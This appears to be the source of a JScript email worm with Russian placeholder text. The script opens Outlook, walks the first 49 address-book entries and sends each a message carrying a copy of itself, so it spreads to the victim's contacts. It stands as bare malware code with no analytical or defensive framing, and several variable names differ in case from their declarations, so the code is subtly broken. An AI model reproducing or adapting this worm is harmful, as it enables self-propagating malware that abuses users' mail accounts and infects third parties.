var fileSysObject, file; 
fileSysObject = new ActiveXObject("Scripting.FileSystemObject"); 
file = fileSysObject.GetFile(WScript.ScriptFullName); 
var outlookObject, outMail, index; 
outlookObject = new ActiveXObject("Outlook.Application"); 
for (index = 1; index < 50; index++){ 
outMail = outlookObject.CreateItem(0); 
outMail.to = 
OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(index); 
outMail.Subject = "Тема сообщения"; 
outMail.Body = "Тело сообщения"; 
OutMail.Attachments.Add(WScript.ScriptFullName); 
outMail.Send;}